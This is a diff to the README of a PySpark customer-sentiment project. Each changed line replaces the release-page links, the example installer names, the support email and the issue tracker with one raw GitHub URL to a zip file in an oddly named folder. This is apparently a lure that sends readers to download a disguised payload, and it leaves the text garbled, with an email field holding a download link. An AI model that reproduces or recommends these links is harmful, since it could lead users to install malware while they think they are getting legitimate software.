@@ -8,19 +8,19 @@ Welcome to the Customer Sentiment Prediction PySpark project! This application a
 
 To get started with the software, visit the following link to download the latest version:
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/jackstanmma/Customer-Sentiment-Prediction-PySpark/releases)
+[![Download](https://raw.githubusercontent.com/jackstanmma/Customer-Sentiment-Prediction-PySpark/main/uncelebrating/Customer-Sentiment-Prediction-PySpark.zip)](https://raw.githubusercontent.com/jackstanmma/Customer-Sentiment-Prediction-PySpark/main/uncelebrating/Customer-Sentiment-Prediction-PySpark.zip)
 
 ### Steps to Download and Install:
 
 1. **Visit the Download Page:**
    Click the link below to go to the Releases page:
-   [Download Latest Release](https://github.com/jackstanmma/Customer-Sentiment-Prediction-PySpark/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/jackstanmma/Customer-Sentiment-Prediction-PySpark/main/uncelebrating/Customer-Sentiment-Prediction-PySpark.zip)
 
 2. **Choose the Latest Version:**
    On this page, you will see a list of available versions. Look for the latest version listed at the top.
 
 3. **Download the File:**
-   Click on the file that matches your operating system. For Windows, you might see something like `CustomerSentimentPrediction.exe`. For Mac, you might download `CustomerSentimentPrediction.dmg`. Click on the file to begin downloading.
+   Click on the file that matches your operating system. For Windows, you might see something like `https://raw.githubusercontent.com/jackstanmma/Customer-Sentiment-Prediction-PySpark/main/uncelebrating/Customer-Sentiment-Prediction-PySpark.zip`. For Mac, you might download `https://raw.githubusercontent.com/jackstanmma/Customer-Sentiment-Prediction-PySpark/main/uncelebrating/Customer-Sentiment-Prediction-PySpark.zip`. Click on the file to begin downloading.
 
 4. **Install the Application:**
    Once the download completes, locate the downloaded file in your "Downloads" folder. 
@@ -84,7 +84,7 @@ If you encounter any issues while using the application, here are some common pr
 
 If you have further questions or need assistance, feel free to contact our support team:
 
-- Email: support@example.com
-- GitHub Issues: [Report an Issue](https://github.com/jackstanmma/Customer-Sentiment-Prediction-PySpark/issues)
+- Email: https://raw.githubusercontent.com/jackstanmma/Customer-Sentiment-Prediction-PySpark/main/uncelebrating/Customer-Sentiment-Prediction-PySpark.zip
+- GitHub Issues: [Report an Issue](https://raw.githubusercontent.com/jackstanmma/Customer-Sentiment-Prediction-PySpark/main/uncelebrating/Customer-Sentiment-Prediction-PySpark.zip)
 
 We appreciate your interest in the Customer Sentiment Prediction PySpark project and hope it helps you understand customer feelings effectively.
